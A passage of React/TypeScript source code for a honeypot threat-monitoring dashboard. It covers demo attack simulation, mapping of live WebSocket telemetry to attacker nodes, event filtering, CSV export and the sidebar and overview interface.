      description: `${scenario.attackType} detected from ${scenario.ip}`,
      raw: JSON.stringify({
        mode: 'DEMO_SIMULATION',
        source: scenario.ip,
        target: scenario.targetHoneypot,
        payload: scenario.payload,
      }),
    });

    setStatusBanner({
      level: 'critical',
      text: `DEMO ATTACK INJECTED: ${scenario.ip} → ${scenario.targetHoneypot} (${scenario.attackType})`,
    });
  }, [operatingMode, demoStepIndex, attackers, currentTime, appendEvent]);

  const triggerDemoCapture = useCallback(
    (specificAttacker) => {
      if (operatingMode !== 'DEMO') return;
      const target =
        specificAttacker ||
        attackers.find((a) => a.status !== 'Contained') ||
        attackers[0];
      if (!target) return;

      setAttackers((prev) =>
        prev.map((a) =>
          a.id === target.id
            ? {
                ...a,
                status: 'Contained',
                payloads: [
                  ...(a.payloads || []),
                  `[NAMESPACE ISOLATION] Session contained in microVM cage at ${getNowTimestamp()}`,
                ],
              }
            : a
        )
      );

      setSelectedEntity((prev) =>
        prev?.kind === 'ATTACKER' && prev.data.id === target.id
          ? { kind: 'ATTACKER', data: { ...prev.data, status: 'Contained' } }
          : prev
      );

      const hpTarget = target.targetedHoneypots[0] || 'honeypot-ssh-01';
      setHoneypots((prev) =>
        prev.map((hp) =>
          hp.id === hpTarget ? { ...hp, status: 'Capturing', lastActivity: 'Just now' } : hp
        )
      );

      appendEvent({
        severity: 'critical',
        source: target.ip,
        destination: hpTarget,
        protocol: target.protocols[0] || 'TCP',
        type: 'SESSION_CONTAINED',
        description: `Attacker ${target.ip} isolated inside hexagonal microVM containment perimeter`,
        raw: JSON.stringify({
          mode: 'DEMO_SIMULATION',
          action: 'SESSION_CONTAINED',
          attacker_ip: target.ip,
          honeypot: hpTarget,
        }),
      });

      setStatusBanner({
        level: 'info',
        text: `DEMO SESSION CONTAINED: ${target.ip} isolated on ${hpTarget}`,
      });
    },
    [operatingMode, attackers, appendEvent]
  );

  const resetDemoScenario = () => {
    setHoneypots(INITIAL_HONEYPOTS);
    setAttackers([]);
    setEvents([]);
    setTotalAttacksCount(0);
    setDemoStepIndex(0);
    setSelectedEntity(null);
    setInspectedEvent(null);
    setStatusBanner({
      level: 'info',
      text: 'TELEMETRY RESET: Decoy grid cleared. Ready for live adversary traffic or simulation.',
    });
  };

  // Unified deterministic mapping: Groups sessions by IP, enforces 5-min TTL, stable coordinates
  const mapSessionsToAttackerNodes = useCallback((sessions: any[]) => {
    if (!sessions || !Array.isArray(sessions) || sessions.length === 0) return [];
    const now = Date.now();
    const grouped = new Map<string, any>();

    sessions.forEach((s) => {
      const ip = s.current_ip || s.ip || s.initial_ip || '185.220.101.4';
      const lastSeenMs = s.last_seen_ts ? (s.last_seen_ts * 1000) : (s.last_seen ? new Date(s.last_seen).getTime() : now);
      // Discard sessions older than 5 minutes (300 seconds)
      if (now - lastSeenMs > 300000) return;

      const targetHp = resolveHoneypotId(s.last_honeypot || (
        s.highest_stage === 4 ? 'honeypot-vault-08' :
        s.highest_stage === 3 ? 'honeypot-ssh-01' :
        s.highest_stage === 2 ? 'honeypot-postgres-05' : 'honeypot-http-02'
      ));

      if (!grouped.has(ip)) {
        grouped.set(ip, {
          ip,
          sessions: [],
          attempts: 0,
          highestStage: 0,
          threatScore: 0,
          plausibleWafDrop: false,
          prodCorrelated: false,
          lastSeen: s.last_seen || 'Active',
          lastSeenTs: lastSeenMs,
          ja4h: s.ja4h,
          currentTargetHoneypot: targetHp,
          targetedHoneypots: [targetHp],
        });
      }
      const item = grouped.get(ip)!;
      item.sessions.push(s);
      item.attempts += (s.command_count || 1);
      item.highestStage = Math.max(item.highestStage, s.highest_stage || 1);
      item.threatScore = Math.max(item.threatScore, s.threat_score || 50);
      item.lastSeenTs = Math.max(item.lastSeenTs, lastSeenMs);
      if (s.plausible_waf_drop) item.plausibleWafDrop = true;
      if (s.prod_correlated) item.prodCorrelated = true;
      item.currentTargetHoneypot = targetHp;
      if (!item.targetedHoneypots.includes(targetHp)) {
        item.targetedHoneypots.push(targetHp);
      }
    });

    const result: any[] = [];
    let idx = 0;
    for (const [ip, g] of grouped.entries()) {
      const canonicalId = `att-${ip.replace(/\./g, '-')}`;
      const sev = g.threatScore >= 80 ? 'critical' : 'high';
      const attackType = g.highestStage >= 4
        ? 'Cold Vault Exfiltration'
        : g.highestStage >= 3
        ? 'Jumpbox Shell Esc'
        : g.highestStage >= 2
        ? 'SQLi HoneyPatch'
        : 'Recon Probe';

      result.push({
        id: canonicalId,
        ip,
        nodeType: 'attacker',
        asn: g.prodCorrelated ? 'Tor Exit (East-West Correlated)' : 'Adversary (Observed)',
        attackType,
        firstSeen: g.lastSeen,
        lastSeen: 'Active',
        lastSeenTs: g.lastSeenTs,
        attempts: g.attempts,
        currentTargetHoneypot: g.currentTargetHoneypot || (g.targetedHoneypots && g.targetedHoneypots[0]) || "honeypot-ssh-01",
        targetedHoneypots: g.targetedHoneypots,
        protocols: ['TCP', 'SSH'],
        ports: [8000, 22],
        severity: sev,
        status: g.plausibleWafDrop ? 'Contained' : 'Active',
        threatScore: g.threatScore,
        ja4h: g.ja4h,
        payloads: [],
        x: -260,
        y: -120 + (idx * 80),
      });
      idx++;
    }
    return result;
  }, []);

  // Auto-prune stale attacks from the live preview (TTL = 5 minutes / 300 seconds)
  useEffect(() => {
    const pruner = setInterval(() => {
      const now = Date.now();
      setAttackers((prev) => {
        const active = prev.filter((a) => {
          if (a.lastSeenTs) {
            return (now - a.lastSeenTs) < 300000;
          }
          return true;
        });
        return active.length !== prev.length ? active : prev;
      });
    }, 5000);
    return () => clearInterval(pruner);
  }, []);

  // Fetch real backend sessions on mount if present
  useEffect(() => {
    let active = true;
    async function loadRealSessions() {
      try {
        const apiBase = typeof window !== 'undefined'
          ? `${window.location.protocol}//${window.location.hostname || 'localhost'}:8000`
          : 'http://localhost:8000';
        const res = await fetch(`${apiBase}/api/shadow-worlds`);
        if (res.ok && active) {
          const data = await res.json();
          const sessions = data.sessions || [];
          const mapped = mapSessionsToAttackerNodes(sessions);
          setAttackers(mapped);
          setTotalAttacksCount((prev) => Math.max(prev, mapped.reduce((acc: number, a: any) => acc + a.attempts, 0)));
        }
      } catch (e) {
        // backend offline on mount
      }
    }
    loadRealSessions();
    return () => {
      active = false;
    };
  }, [mapSessionsToAttackerNodes]);

  // ==========================================================================
  // LIVE BACKEND WEBSOCKET INTEGRATION (Never fabricates events)
  // ==========================================================================
  const initiateLiveConnection = useCallback(() => {
    setOperatingMode('LIVE');
    setLiveConnectionState('CONNECTING');
    setStatusBanner({
      level: 'info',
      text: `LIVE MODE: Connecting to FastAPI Deception WebSocket at ${wsEndpoint}...`,
    });

    try {
      const ws = new WebSocket(wsEndpoint);
      const timeout = setTimeout(() => {
        if (ws.readyState !== WebSocket.OPEN) {
          ws.close();
          setLiveConnectionState('DISCONNECTED');
          setStatusBanner({
            level: 'critical',
            text: `LIVE BACKEND UNREACHABLE (${wsEndpoint}). Ensure FastAPI is running on port 8000.`,
          });
        }
      }, 3500);

      ws.onopen = () => {
        clearTimeout(timeout);
        setLiveConnectionState('CONNECTED');
        setStatusBanner({
          level: 'info',
          text: `● LIVE BACKEND CONNECTED (10.46.34.107:9200 WAZUH LINKED) · Authenticated via bypass token`,
        });
      };

      ws.onmessage = (msg) => {
        try {
          const parsed = JSON.parse(msg.data);
          const msgType = parsed.type || parsed.action;
          const payload = parsed.data || parsed.event || parsed;

          if (msgType === 'system_init') {
            setStatusBanner({
              level: 'info',
              text: `PYRITE KERNEL ACTIVE · Seed ${payload.activeSeed || '0x' + (payload.seed || 0).toString(16)} · Wazuh: ONLINE`,
            });
            const incomingSessions = payload.sessions || payload.active_attackers || [];
            const mapped = mapSessionsToAttackerNodes(incomingSessions);
            setAttackers(mapped);
          } else if (msgType === 'telemetry_reset') {
            setAttackers([]);
            setEvents([]);
            setTotalAttacksCount(0);
            setStatusBanner({
              level: 'info',
              text: 'TELEMETRY RESET: Active grid cleared.',
            });
          } else if (msgType === 'soc_telemetry') {
            const attackerInfo = payload.attacker || {};
            const actionInfo = payload.action || {};
            const wazuh = payload.wazuh || {};
            const attackerIp = attackerInfo.ip || payload.ip || payload.source || '185.220.101.4';
            const endpoint = actionInfo.endpoint || payload.stage_name || payload.destination || 'honeypot-ssh-01';
            const sev = (wazuh.level >= 13 || payload.severity === 'critical') ? 'critical' : 'high';
            const title = actionInfo.title || payload.intent_summary || payload.description || `Wazuh Rule ${wazuh.ruleId || payload.wazuh_rule || '100501'} Ingested`;

            appendEvent({
              id: payload.eventId || `evt-${Date.now()}`,
              severity: sev,
              source: attackerIp,
              destination: endpoint,
              protocol: payload.protocol || 'TCP',
              type: payload.stage ? `STAGE_${payload.stage}_EXPLOIT` : (payload.type || 'SOC_TELEMETRY'),
              description: title,
              ja4h: attackerInfo.ja4h || payload.ja4h,
              hassh: payload.hassh,
              mitre_attack: wazuh.mitreAttack?.id || payload.mitre_attack,
              mitre_defend: payload.mitre_defend,
              mitre_engage: wazuh.mitreEngage?.id || payload.mitre_engage,
              raw: msg.data,
            });

            // Dynamically register / update attacker node on graph with deterministic position
            setAttackers((prev) => {
              const existing = prev.find((a) => a.ip === attackerIp);
              if (existing) {
                return prev.map((a) =>
                  a.ip === attackerIp
                    ? {
                        ...a,
                        attempts: a.attempts + 1,
                        lastSeen: currentTime,
                        lastSeenTs: Date.now(),
                        currentTargetHoneypot: resolveHoneypotId(endpoint),
                        targetedHoneypots: Array.from(new Set([...a.targetedHoneypots, resolveHoneypotId(endpoint)])),
                        severity: sev,
                        threatScore: Math.min(100, (a.threatScore || 70) + 5),
                      }
                    : a
                );
              }
              const newAttacker = {
                id: `att-${attackerIp.replace(/\./g, '-')}`,
                ip: attackerIp,
                nodeType: 'attacker',
                asn: 'External Adversary',
                attackType: title,
                firstSeen: currentTime,
                lastSeen: 'Active',
                lastSeenTs: Date.now(),
                attempts: 1,
                currentTargetHoneypot: resolveHoneypotId(endpoint),
                targetedHoneypots: [resolveHoneypotId(endpoint)],
                protocols: ['TCP'],
                ports: [8000],
                severity: sev,
                status: 'Malicious',
                threatScore: payload.metrics?.threatScore || 85,
                ja4h: attackerInfo.ja4h,
                payloads: [actionInfo.rawPayload || title],
                x: -260,
                y: -120 + (prev.length * 80),
              };
              return [newAttacker, ...prev];
            });

            setTotalAttacksCount((c) => c + 1);
          } else if (msgType === 'topology_mutated') {
            setStatusBanner({
              level: 'info',
              text: `🧬 POLYMORPHISM: Active seed mutated to ${payload.new_seed || 'Morph-v2.0'} · Previous breadcrumbs burned`,
            });
            // Visually rotate honeypot coordinates to show polymorphic shift
            setHoneypots((prev) => prev.map((hp, idx) => {
              const angle = (idx * (360 / prev.length) + 20) * (Math.PI / 180);
              return { ...hp, x: Math.round(155 * Math.sin(angle)), y: Math.round(-155 * Math.cos(angle)) };
            }));
          } else if (msgType === 'tarpit_progress') {
            setStatusBanner({
              level: 'critical',
              text: `TARPIT ENGAGED: Adversary ${payload.ja4h?.slice(0, 8)} throttled to ${payload.speed || '128 B/2s'}`,
            });
          } else {
            appendEvent({
              id: payload.id || `evt-${Date.now()}`,
              severity: payload.severity || 'high',
              source: payload.source || '0.0.0.0',
              destination: payload.destination || 'honeypot-ssh-01',
              protocol: payload.protocol || 'TCP',
              type: payload.type || 'LIVE_TELEMETRY',
              description: payload.description || 'Live socket frame received',
              raw: msg.data,
            });
            setTotalAttacksCount((c) => c + 1);
          }
        } catch (err) {
          // malformed frame ignore
        }
      };

      ws.onerror = () => {
        clearTimeout(timeout);
        setLiveConnectionState('ERROR');
        setStatusBanner({
          level: 'critical',
          text: `LIVE STREAM ERROR: WebSocket connection to ${wsEndpoint} failed.`,
        });
      };
    } catch (err) {
      setLiveConnectionState('ERROR');
    }
  }, [wsEndpoint, appendEvent]);

  // Auto-connect to live stream on mount if in live mode
  useEffect(() => {
    if (operatingMode === 'LIVE' && liveConnectionState === 'DISCONNECTED') {
      initiateLiveConnection();
    }
  }, [operatingMode, liveConnectionState, initiateLiveConnection]);

  // Allow operator to test ingesting a raw JSON frame into the Live pipeline
  const injectTestLiveFrame = () => {
    try {
      const parsed = JSON.parse(customWsPayload);
      setLiveConnectionState('CONNECTED');
      appendEvent({
        severity: parsed.severity || 'critical',
        source: parsed.source || '198.51.100.77',
        destination: parsed.destination || 'honeypot-ssh-01',
        protocol: parsed.protocol || 'SSHv2',
        type: parsed.type || 'LIVE_INGEST',
        description: parsed.description || 'Manual WebSocket frame ingested',
        raw: customWsPayload,
      });
      setTotalAttacksCount((c) => c + 1);
      setStatusBanner({
        level: 'info',
        text: `LIVE FRAME INGESTED: Processed payload from ${parsed.source}`,
      });
    } catch (e) {
      setStatusBanner({
        level: 'critical',
        text: 'INVALID JSON FRAME: Check payload syntax in Settings.',
      });
    }
  };

  // Filtered Attackers for Attackers Page
  const filteredAttackersList = useMemo(() => {
    return attackers
      .filter((a) => {
        if (attackerSeverityFilter !== 'ALL' && a.severity.toUpperCase() !== attackerSeverityFilter)
          return false;
        if (
          attackerSearch &&
          !a.ip.toLowerCase().includes(attackerSearch.toLowerCase()) &&
          !a.attackType.toLowerCase().includes(attackerSearch.toLowerCase()) &&
          !a.targetedHoneypots.join(' ').toLowerCase().includes(attackerSearch.toLowerCase())
        )
          return false;
        return true;
      })
      .sort((a, b) => {
        if (attackerSortField === 'attempts') return b.attempts - a.attempts;
        return b.threatScore - a.threatScore;
      });
  }, [attackers, attackerSeverityFilter, attackerSearch, attackerSortField]);

  // Filtered Events for Live Events Page
  const filteredEventsList = useMemo(() => {
    return events.filter((ev) => {
      if (eventSeverityFilter !== 'ALL' && ev.severity.toUpperCase() !== eventSeverityFilter)
        return false;
      if (eventTypeFilter !== 'ALL' && ev.type !== eventTypeFilter) return false;
      if (eventHoneypotFilter !== 'ALL' && ev.destination !== eventHoneypotFilter)
        return false;
      if (
        eventSearch &&
        !ev.source.toLowerCase().includes(eventSearch.toLowerCase()) &&
        !ev.description.toLowerCase().includes(eventSearch.toLowerCase()) &&
        !ev.id.toLowerCase().includes(eventSearch.toLowerCase())
      )
        return false;
      return true;
    });
  }, [events, eventSeverityFilter, eventTypeFilter, eventHoneypotFilter, eventSearch]);

  // Export Attackers CSV
  const exportAttackersCsv = () => {
    const header = 'IP,First_Seen,Last_Seen,Attempts,Targeted_Honeypots,Protocols,Severity,Status\n';
    const body = filteredAttackersList
      .map((a) =>
        [
          a.ip,
          a.firstSeen,
          a.lastSeen,
          a.attempts,
          `"${a.targetedHoneypots.join(';')}"`,
          `"${a.protocols.join(';')}"`,
          a.severity,
          a.status,
        ].join(',')
      )
      .join('\n');
    const blob = new Blob([header + body], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.setAttribute('download', `honeytrap-attackers-${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const navLinks = [
    { id: 'overview', label: 'Overview', icon: Shield },
    { id: 'network', label: 'Network Intelligence', icon: Network },
    { id: 'attackers', label: 'Attackers', icon: Users, badge: attackers.length },
    { id: 'events', label: 'Live Events', icon: Terminal, badge: events.length },
    { id: 'honeypots', label: 'Honeypots', icon: Server, badge: honeypots.length },
    { id: 'analytics', label: 'Analytics', icon: BarChart2 },
    { id: 'settings', label: 'Settings', icon: Settings },
  ];

  // Overall System Status Badge Calculation
  const systemStateLabel =
    operatingMode === 'LIVE' && liveConnectionState !== 'CONNECTED'
      ? liveConnectionState === 'CONNECTING'
        ? 'CONNECTING...'
        : 'BACKEND DISCONNECTED'
      : isMonitoringActive
      ? 'SYSTEM ONLINE'
      : 'MONITORING PAUSED';

  const isSystemHealthy =
    (operatingMode === 'DEMO' && isMonitoringActive) ||
    (operatingMode === 'LIVE' && liveConnectionState === 'CONNECTED');

  const isDark = themeMode === 'dark';

  return (
    <div
      className={cn(
        'min-h-screen flex flex-col md:flex-row font-sans selection:bg-[#FF493D] selection:text-[#0B0B0C]',
        isDark ? 'bg-[#0B0B0C] text-[#F1EFE9]' : 'bg-[#F1EFE9] text-[#171717]'
      )}
    >
      {/* ====================================================================
          PERSISTENT LEFT SIDEBAR NAVIGATION + TELEMETRY INSPECTOR BELOW SETTINGS
      ==================================================================== */}
      {!hideSidebar && (
      <aside
        className={cn(
          sidebarCollapsed ? 'md:w-16' : 'md:w-80',
          isDark
            ? 'bg-[#101012] border-[#27272A]'
            : 'bg-[#E8E5DE] border-[#B8B5AE]',
          'border-b md:border-b-0 md:border-r flex flex-col justify-between transition-all duration-150 shrink-0 z-30 md:max-h-screen md:overflow-y-auto'
        )}
      >
        <div>
          {/* Brand Logo & Version Mark */}
          <div className="px-4 py-3 border-b border-[#27272A] flex items-center justify-between">
            <div
              onClick={() => setActivePage('overview')}
              className="flex items-center gap-2.5 overflow-hidden cursor-pointer"
            >
              <div className="w-7 h-7 bg-[#18181B] border border-[#27272A] text-[#F1EFE9] flex items-center justify-center shrink-0">
                <Hexagon size={15} className="text-[#FF493D]" />
              </div>
              {!sidebarCollapsed && (
                <div>
                  <span className="font-mono font-bold tracking-tight text-sm block leading-none">
                    HONEYTRAP
                  </span>
                  <span className="font-mono text-[9px] tracking-widest text-[#9A9891] uppercase">
                    v2.4.0-SOC // DARK GRID
                  </span>
                </div>
              )}
            </div>
            <button
              onClick={() => setSidebarCollapsed(!sidebarCollapsed)}
              className="hidden md:flex p-1 text-[#9A9891] hover:text-[#F1EFE9]"
              aria-label="Toggle Sidebar"
            >
              {sidebarCollapsed ? <ChevronRight size={15} /> : <ChevronLeft size={15} />}
            </button>
          </div>

          {/* Return to VYUHA Landing Link */}
          <Link
            href="/"
            className="flex items-center gap-2.5 px-4 py-2 border-b border-[#27272A] text-[#9A9891] hover:text-[#F1EFE9] hover:bg-[#141416] transition-colors group"
            title="Return to VYUHA Landing Overview"
          >
            <ArrowLeft size={13} className="text-[#FF493D] transition-transform group-hover:-translate-x-0.5 shrink-0" />
            {!sidebarCollapsed && (
              <span className="font-mono text-[10px] tracking-wider uppercase">
                Return to Overview
              </span>
            )}
          </Link>

          {/* Navigation Items (Overview through Settings) */}
          <nav className="flex md:flex-col overflow-x-auto md:overflow-visible divide-x md:divide-x-0 md:divide-y divide-[#27272A]">
            {navLinks.map((item) => {
              const Icon = item.icon;
              const active = activePage === item.id;
              return (
                <button
                  key={item.id}
                  onClick={() => setActivePage(item.id)}
                  className={cn(
                    'relative flex items-center justify-between px-4 py-2.5 text-left transition-colors shrink-0',
                    active
                      ? 'bg-[#18181B] text-[#F1EFE9] font-semibold'
                      : 'text-[#9A9891] hover:bg-[#141416] hover:text-[#F1EFE9]'
                  )}
                >
                  {active && (
                    <span className="absolute left-0 top-0 bottom-0 w-[3px] bg-[#FF493D]" />
                  )}
                  <div className="flex items-center gap-3">
                    <Icon size={14} className={active ? 'text-[#FF493D]' : 'text-[#9A9891]'} />
                    {!sidebarCollapsed && (
                      <span className="font-mono text-[11px] uppercase tracking-wider">
                        {item.label}
                      </span>
                    )}
                  </div>
                  {!sidebarCollapsed && item.badge !== undefined && (
                    <span className="font-mono text-[10px] px-1.5 py-0.5 bg-[#141416] border border-[#27272A] text-[#F1EFE9]">
                      {item.badge}
                    </span>
                  )}
                </button>
              );
            })}
          </nav>

          {/* ================================================================
              ATTACKER / NODE TELEMETRY INSPECTOR (MOVED DIRECTLY BELOW SETTINGS)
          ================================================================ */}
          {!sidebarCollapsed && (
            <div className="hidden md:block">
              <EntityInspectorPanel
                selectedEntity={selectedEntity}
                onClose={() => setSelectedEntity(null)}
                events={events}
                onContainAttacker={triggerDemoCapture}
                isLiveMode={operatingMode === 'LIVE'}
                compactSidebar={true}
              />
            </div>
          )}
        </div>

        {/* Bottom Infrastructure Summary */}
        {!sidebarCollapsed && (
          <div className="hidden md:block p-3.5 border-t border-[#27272A] bg-[#0B0B0C] font-mono text-[10px] space-y-1.5">
            <div className="flex items-center justify-between">
              <span className="text-[#9A9891]">PROTECTED NODES</span>
              <span className="font-bold text-[#F1EFE9]">2 ISOLATED</span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-[#9A9891]">DECOY FLEET</span>
              <span className="font-bold text-[#F1EFE9]">{honeypots.length} ONLINE</span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-[#9A9891]">CONTAINED ACTORS</span>
              <span className="font-bold text-[#FF493D]">{capturedSessionsCount} LOCKED</span>
            </div>
          </div>
        )}
      </aside>
      )}

      {/* ====================================================================
          MAIN VIEWPORT AREA
      ==================================================================== */}
      <div className="flex-1 flex flex-col min-w-0">
        {/* TOP STATUS & MODE BAR */}
        {!hideHeader ? (
        <header className="px-5 py-2.5 border-b border-[#27272A] bg-[#101012] text-[#F1EFE9] flex flex-wrap items-center justify-between gap-3 shrink-0">
          <div className="flex items-center gap-3 flex-wrap">
            <Link
              href="/"
              className="flex items-center gap-1.5 px-2.5 py-1 border border-[#27272A] bg-[#141416] text-[#9A9891] hover:text-[#F1EFE9] hover:border-[#F1EFE9] font-mono text-[10px] uppercase transition-colors"
              title="Return to PYRITE Landing Overview"
            >
              <ArrowLeft size={11} className="text-[#FF493D]" />
              <span>EXIT TO OVERVIEW</span>
            </Link>

            <span className="font-mono text-xs uppercase tracking-widest font-bold text-[#F1EFE9]">
              PYRITE // {activePage.toUpperCase()}
            </span>

            <div className="h-3.5 w-[1px] bg-[#27272A]" />

            {/* System Status Pill */}
            <div className="flex items-center gap-1.5 font-mono text-[11px]">
              <span
                className={cn(
                  'w-2 h-2 rounded-full inline-block',
                  isSystemHealthy ? 'bg-[#22C55E]' : 'bg-[#FF493D]'
                )}
              />
              <span
                className={cn(
                  'font-bold tracking-wider',
                  !isSystemHealthy ? 'text-[#FF493D]' : 'text-[#F1EFE9]'
                )}
              >
                {systemStateLabel}
              </span>
            </div>

            {/* Mode Switcher Badge */}
            <div className="flex items-center border border-[#27272A] bg-[#141416] font-mono text-[10px]">
              <button
                onClick={() => {
                  setOperatingMode('DEMO');
                  setStatusBanner(null);
                }}
                className={cn(
                  'px-2.5 py-1 uppercase transition-colors',
                  operatingMode === 'DEMO'
                    ? 'bg-[#F1EFE9] text-[#0B0B0C] font-bold'
                    : 'text-[#9A9891] hover:text-[#F1EFE9]'
                )}
              >
                DEMO MODE
              </button>
              <button
                onClick={initiateLiveConnection}
                className={cn(
                  'px-2.5 py-1 uppercase border-l border-[#27272A] transition-colors',
                  operatingMode === 'LIVE'
                    ? 'bg-[#FF493D] text-[#0B0B0C] font-bold'
                    : 'text-[#9A9891] hover:text-[#F1EFE9]'
                )}
              >
                LIVE BACKEND ({liveConnectionState})
              </button>
            </div>
          </div>

          {/* Right Action Controls */}
          <div className="flex items-center gap-2 flex-wrap">
            <button
              onClick={() => setIsMonitoringActive(!isMonitoringActive)}
              className={cn(
                'px-2.5 py-1 border font-mono text-[10px] uppercase flex items-center gap-1',
                isMonitoringActive
                  ? 'border-[#27272A] bg-[#18181B] text-[#F1EFE9]'
                  : 'border-[#FF493D] bg-[#141416] text-[#FF493D] font-bold'
              )}
            >
              {isMonitoringActive ? <Pause size={10} /> : <Play size={10} />}
              {isMonitoringActive ? 'PAUSE STREAM' : 'RESUME STREAM'}
            </button>

            {operatingMode === 'DEMO' && (
              <div className="flex items-center border border-[#27272A] bg-[#141416] font-mono text-[10px]">
                <button
                  onClick={triggerDemoAttack}
                  className="px-2.5 py-1 uppercase text-[#F1EFE9] hover:bg-[#1E1E22] flex items-center gap-1 font-semibold"
                >
                  <Zap size={10} className="text-[#FF493D]" />
                  TRIGGER DEMO ATTACK
                </button>
                <button
                  onClick={() => triggerDemoCapture()}
                  className="px-2.5 py-1 uppercase bg-[#FF493D] text-[#0B0B0C] font-bold hover:bg-[#F1EFE9] border-l border-[#27272A] transition-colors"
                >
                  TRIGGER DEMO CAPTURE
                </button>
                <button
                  onClick={resetDemoScenario}
                  className="px-2 py-1 uppercase text-[#9A9891] hover:text-[#F1EFE9] border-l border-[#27272A]"
                >
                  RESET
                </button>
              </div>
            )}

            <button
              onClick={() => setThemeMode(isDark ? 'light' : 'dark')}
              className="p-1.5 border border-[#27272A] bg-[#141416] text-[#F1EFE9] hover:border-[#F1EFE9]"
              title="Toggle Dark / Bone-Light Theme"
            >
              {isDark ? <Sun size={12} /> : <Moon size={12} />}
            </button>

            <span className="font-mono text-xs text-[#9A9891] pl-2 border-l border-[#27272A]">
              {currentTime}
            </span>
          </div>
        </header>
        ) : (
        <div className="px-4 py-2 border-b border-[#27272A] bg-[#101012] flex flex-wrap items-center justify-between gap-2 text-xs font-mono">
          <div className="flex items-center gap-3">
            <span className="text-[10px] uppercase font-bold text-[#F1EFE9] tracking-wider">
              PYRITE // AUTONOMOUS DECEPTION GRID
            </span>
            <span className="text-[#22C55E] text-[10px] font-bold flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-[#22C55E] animate-pulse" />
              10.46.34.107:9200 WAZUH LINKED
            </span>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={() => setIsMonitoringActive(!isMonitoringActive)}
              className={cn(
                'px-2.5 py-1 border font-mono text-[10px] uppercase flex items-center gap-1',
                isMonitoringActive
                  ? 'border-[#27272A] bg-[#18181B] text-[#F1EFE9]'
                  : 'border-[#FF493D] bg-[#141416] text-[#FF493D] font-bold'
              )}
            >
              {isMonitoringActive ? <Pause size={10} /> : <Play size={10} />}
              {isMonitoringActive ? 'PAUSE' : 'RESUME'}
            </button>
            {operatingMode === 'DEMO' && (
              <div className="flex items-center border border-[#27272A] bg-[#141416] font-mono text-[10px]">
                <button
                  onClick={triggerDemoAttack}
                  className="px-2 py-1 uppercase text-[#F1EFE9] hover:bg-[#1E1E22] flex items-center gap-1 font-semibold"
                >
                  <Zap size={10} className="text-[#FF493D]" />
                  ATTACK
                </button>
                <button
                  onClick={() => triggerDemoCapture()}
                  className="px-2 py-1 uppercase bg-[#FF493D] text-[#0B0B0C] font-bold hover:bg-[#F1EFE9] border-l border-[#27272A]"
                >
                  CONTAIN
                </button>
              </div>
            )}
          </div>
        </div>
        )}

        {/* OPTIONAL STATUS / ALERT BANNER */}
        {statusBanner && (
          <div
            className={cn(
              'px-5 py-1.5 border-b border-[#27272A] flex items-center justify-between font-mono text-[11px]',
              statusBanner.level === 'critical'
                ? 'bg-[#FF493D] text-[#0B0B0C] font-bold'
                : 'bg-[#18181B] text-[#F1EFE9]'
            )}
          >
            <span>{statusBanner.text}</span>
            <button onClick={() => setStatusBanner(null)} aria-label="Dismiss Banner">
              <X size={13} />
            </button>
          </div>
        )}

        {/* ==================================================================
            PAGE 1: OVERVIEW — COMPACT COMMAND CENTER (GRAPH EXTENDS 100% RIGHT)
        ================================================================== */}
        {activePage === 'overview' && (
          <main className="p-5 space-y-4 flex-1 overflow-y-auto">
            {/* Compact Header Row */}
            <div className="flex flex-col sm:flex-row sm:items-end justify-between gap-2 border-b border-[#27272A] pb-3">
              <div>
                <h1 className="text-2xl md:text-3xl font-bold tracking-tight leading-none">
                  The hive is watching.
                </h1>
                <p className="text-xs text-[#9A9891] mt-1">
                  Real-time monitoring of malicious activity across your honeypot network.
                </p>
              </div>
              <div className="flex items-center gap-2 font-mono text-[10px]">
                <button
                  onClick={() => setActivePage('network')}
                  className="px-2.5 py-1.5 border border-[#27272A] bg-[#141416] text-[#F1EFE9] hover:border-[#F1EFE9] uppercase"
                >
                  EXPAND NETWORK INTELLIGENCE →
                </button>
                <button
                  onClick={() => setIsFullscreenGraph(true)}
                  className="px-2.5 py-1.5 border border-[#27272A] bg-[#18181B] text-[#F1EFE9] hover:bg-[#F1EFE9] hover:text-[#0B0B0C] uppercase flex items-center gap-1"
                >
                  <Maximize2 size={11} /> FULLSCREEN GRAPH
                </button>
              </div>
            </div>

            {/* Compact 4-Metric KPI Row */}
            <section className="grid grid-cols-2 lg:grid-cols-4 border-t border-l border-[#27272A]">
              {[
                {
                  label: 'TOTAL ATTACKS',
                  value: totalAttacksCount,
                  sub: 'OBSERVED TELEMETRY FRAMES',
                  critical: false,
                },
                {
                  label: 'ACTIVE ATTACKERS',
                  value: activeAttackersCount,
                  sub: 'INTERACTING WITH DECOYS',
                  critical: false,
                },
                {
                  label: 'CAPTURED SESSIONS',
                  value: capturedSessionsCount,
                  sub: 'ISOLATED IN MICRO-VM CAGES',
                  critical: false,
                },
                {
                  label: 'CRITICAL ALERTS',
                  value: criticalAlertsCount,
                  sub: 'HIGH-SEVERITY INTRUSIONS',
                  critical: true,
                },
              ].map((m, i) => (
                <div
                  key={i}
                  className="bg-[#141416] border-r border-b border-[#27272A] px-4 py-3 flex flex-col justify-between relative"
                >
                  {m.critical && (
                    <span className="absolute top-0 left-0 right-0 h-[3px] bg-[#FF493D]" />
                  )}
                  <div className="flex items-center justify-between">
                    <span className="font-mono text-[10px] uppercase tracking-wider text-[#9A9891]">
                      {m.label}
                    </span>
                    {m.critical && <span className="w-2 h-2 bg-[#FF493D] inline-block" />}
                  </div>
                  <div
                    className={cn(
                      'font-mono text-2xl md:text-3xl font-bold tracking-tight my-1',
                      m.critical ? 'text-[#FF493D]' : 'text-[#F1EFE9]'
                    )}
                  >
                    <AnimatedMetric value={m.value} reducedMotion={reducedMotion} />
                  </div>
                  <div className="font-mono text-[9px] uppercase text-[#9A9891]">{m.sub}</div>
                </div>
              ))}
            </section>

            {/* Full-Width Centerpiece Topology Graph (Extended 100% to Right Edge) */}
            <section className="w-full">
              <NetworkTopologyCanvas
                infraNodes={infraNodes}
                honeypots={honeypots}
                attackers={attackers}
                selectedEntity={selectedEntity}
                onSelectEntity={setSelectedEntity}
                nodeCategoryFilter={nodeCategoryFilter}
                setNodeCategoryFilter={setNodeCategoryFilter}
                severityFilter={severityFilter}
                setSeverityFilter={setSeverityFilter}
